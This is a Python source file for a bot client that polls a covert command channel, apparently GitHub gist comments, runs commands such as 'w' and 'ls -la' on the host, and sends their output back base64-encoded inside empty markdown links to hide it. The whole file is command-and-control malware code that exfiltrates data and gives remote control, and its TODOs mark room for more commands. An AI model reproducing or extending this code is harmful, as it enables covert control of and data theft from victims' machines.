import base64
import json
import subprocess
import threading
from queue import Queue

import requests

from comm import Type, Channel
from time import sleep


class Bot:
    def __init__(self, token: str, gist: str):
        self.channel = Channel(Type.BOT, token, gist)
        self.unprocessed_commands = Queue()
        self.active = True
        self.worker_thread = None
        self.ip = json.loads(
            requests.get("https://api64.ipify.org?format=json").content.decode("utf-8")
        )["ip"]

        self.wait_for_commands()

    def wait_for_commands(self):
        self.worker_thread = threading.Thread(
            target=self.process_commands, daemon=True
        ).start()

        while self.active:
            for command in self.channel.check_messages():
                print(f"New command = {command.body}")
                self.unprocessed_commands.put(command)

            sleep(2)

    def process_commands(self):

        while self.active:
            current_command = self.unprocessed_commands.get()
            response_id = f"[](https://{base64.b64encode(f'{current_command.id}-{self.ip}'.encode('utf-8')).decode('utf-8')})"

            print(f"Processing command = {current_command.body}")

            # PING
            if Channel.PING_REQUEST in current_command.body:
                self.channel.send_message(f"{Channel.PING_RESPONSE}" f"{response_id}")

            # W
            elif (
                Channel.W_REQUEST in current_command.body
                and self.ip in current_command.body
            ):
                process = subprocess.run(["w"], capture_output=True)
                self.channel.send_message(
                    f"{Channel.W_RESPONSE}\n"
                    f"[](https://{base64.b64encode(process.stdout).decode('utf-8')})"
                    f"[](https://{base64.b64encode(process.stderr).decode('utf-8')})"
                    f"{response_id}"
                )

            # LS
            elif (
                Channel.LS_REQUEST in current_command.body
                and self.ip in current_command.body
            ):
                path = (
                    current_command.body.split("<")[1].split(">")[0]
                    if "<" in current_command.body and ">" in current_command.body
                    else None
                )
                args = ["ls", "-la", path] if path else ["ls", "-la"]
                process = subprocess.run(args, capture_output=True)
                self.channel.send_message(
                    f"{Channel.LS_RESPONSE}\n"
                    f"[](https://{base64.b64encode(process.stdout).decode('utf-8')})"
                    f"[](https://{base64.b64encode(process.stderr).decode('utf-8')})"
                    f"{response_id}"
                )

            # TODO: Put the id of the message we are reacting to to the message
            # TODO: Additional commands

            self.unprocessed_commands.task_done()
